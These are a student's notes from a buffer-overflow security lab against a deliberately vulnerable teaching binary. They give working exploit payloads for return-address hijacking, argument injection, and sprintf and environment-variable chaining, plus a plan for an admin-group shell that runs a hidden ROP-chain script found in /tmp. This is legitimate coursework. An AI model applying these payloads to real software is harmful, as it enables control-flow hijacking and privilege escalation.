lab 3

part1
buffer overflow the program to create the file "uid_[uid]_crack" in the /home/admin/ directory.

08048e72 <log_result>

part2
buffer overflow the program to create the file "uid_[uid]_crack_advanced" in the /home/admin/ directory.

08048ea0 <log_result_advanced>

part3
Create a uid_[uid]_crack_super file in the /home/admin/ directory.

part4
Create a shell with the privilege of the admin group (verified by TA in lab)

------------------------------------

more than 24 bytes of input will cause segfault

./try_me aaaaaaaaaaaaaaaaaaaaaaaa[here]

33 bytes will overwrite eip
the section with bbbb will overwrite eip

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb")"

------------------------------------

PART 1 - (done)

target the log_result function

address of log_result
08048e72
\x72\x8e\x04\x08

need to do "offset + function address"

running the executable on input generates file, but causes segfault

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08")"

./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08"')"

dmesg | tail -1

[598993.571679] try_me[22715]: segfault at ffffd800 ip 00000000ffffd800 sp 00000000ffffd654 error 15

fix segfault to successful program termination

need to do "offset + function address + dummy return address"

append return address to get successful exit after create file

look for exit calls in objdump

 804915d:       e8 be 56 00 00          call   804e820 <exit>

address of where call goes to
\x20\xe8\x04\x08

append after the exit call

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08")"

./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08"')"

------------------------------------

PART 2 (done)

target the log_result_advanced function

address of log_result_advanced
08048ea0
\xa0\x8e\x04\x08

also this checks if is parameter is 0xefbeadde
which is little endian "deadbeef" and needs to get put onto stack
\xde\xad\xbe\xef

need to do "offset + function address + dummy return address + arguments"

./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08bbbb\xde\xad\xbe\xef"')"

running the executable on input generates file, but causes segfault

this is because of return address is "bbbb" which is 0x62626262

dmesg | tail -1

[23527.547142] try_me[5682]: segfault at 62626262 ip 0000000062626262 sp 00000000fffde674 error 14

fix segfault to successful program termination

look for exit calls in objdump

 804915d:       e8 be 56 00 00          call   804e820 <exit>

address of where call goes to
\x20\xe8\x04\x08

replace "bbbb" with address to get successful exit after create file

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef")"

./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef"')"

------------------------------------

PART3

target the log_result function

probably want to overwrite the "char filename[100]" since is global buffer

The C library function int sprintf(char *str, const char *format, ...) sends formatted output to a string pointed to, by str

target the sprintf in main

8048f3a:       e8 f1 62 00 00          call   804f230 <_IO_sprintf>


0x08048f2d      ff75f4         push dword [local_ch]
0x08048f30      68ade20b08     push str.home_admin_uid__d_crack ; 0x80be2ad ; "/home/admin/uid_%d_crack"
0x08048f35      6840bf0e08     push obj.filename           ; 0x80ebf40
0x08048f3a      e8f1620000     call sym.sprintf            ; int sprintf(char *s, const char *format, ...)


maybe:

target sprintf to write to buffer then goto the log_result function
would need to find a way to append "_super" to the buffer
or
try and push some stuff onto the stack and call open directly
or
maybe try to do a strcpy into filename with the input like in test, and then call the log_result

main() does

push int uid        // ... (extra parameters)
push format string  // const char* format
push string buffer  // char* s
call sprintf

log_result() does

0x08048e7b      6840040000     push 0x440                  ; 1088
0x08048e80      6840bf0e08     push obj.filename           ; 0x80ebf40
0x08048e85      e866400200     call sym.__open


template from part1:

offset + addr of log_result + addr of exit

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08")"

need to add some more to/change the shell code after this probably


----

try using template from part2

offset + address log_result_advanced + address of exit + deadbeef

./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef")"


running in GDB
use full name of try_me "/home/admin/try_me"
unset the environment variables LINES, COLUMNS

maybe

try and do ./try_me "string1" "string2"

target the log_result_advanced

try to find the second argument in memory

try to get to the part which calls open using the ebp + offset

need to overwrite the ebp with the location of the second argument in memory

------------------------------------
using environment 
For  this  section,  we  are  going  to  use sprintf to  write  to  the  global char filename[100] buffer.
Then  we  call log_result to create the file.

first set USER=uid_1003_crack_super

(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) run
Starting program: /home/admin/try_me 

Breakpoint 1, main (argc=1, args=0xffffd714) at test.c:41
41	test.c: No such file or directory.
(gdb) x/s *((char **)environ + 7)
0xffffd8fb:	"USER=uid_1003_super_crack"

home/admin/try_me "$(python -c 'print("a" * 29 + "\x30\xf2\x04\x08" + "\x72\x8e\x04\x08" + "\x40\xbf\x0e\x08" + "\xfb\xd8\xff\xff")')"

produces id_1003_super_crack

by changing the address of USER from 0xffffd8fb to 0xffffd8fa and running it again, we get the correct result


PART4

rop chain?

try: shellstorm ROPGadget

----

also found a hidden file on the server with the rop code

in tmp is .ropchain.py

from the /home/admin run

./try_me "$(../../tmp/.ropchain.py)"

------------------------------------
